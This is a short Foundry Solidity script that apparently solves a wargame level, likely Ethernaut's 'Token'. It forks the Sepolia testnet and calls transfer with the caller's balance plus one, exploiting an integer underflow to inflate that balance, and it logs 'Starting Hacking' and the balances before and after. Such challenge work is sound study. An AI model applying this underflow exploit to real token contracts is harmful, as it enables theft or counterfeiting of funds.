// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address TokenAddress = 0xC2939F68AC2bC7b4874506a93ef70728a38F9B58;
        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        uint256 initial_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);

        console.log("Initial Balance", initial_balance);

        Token(TokenAddress).transfer(TokenAddress, initial_balance + 1);

        uint256 final_balance = Token(TokenAddress).balanceOf(0xA01f6403d49857b58D3794C12E028c3681b24F98);

        console.log("Final Balance", final_balance);

        vm.stopBroadcast();
    }
}
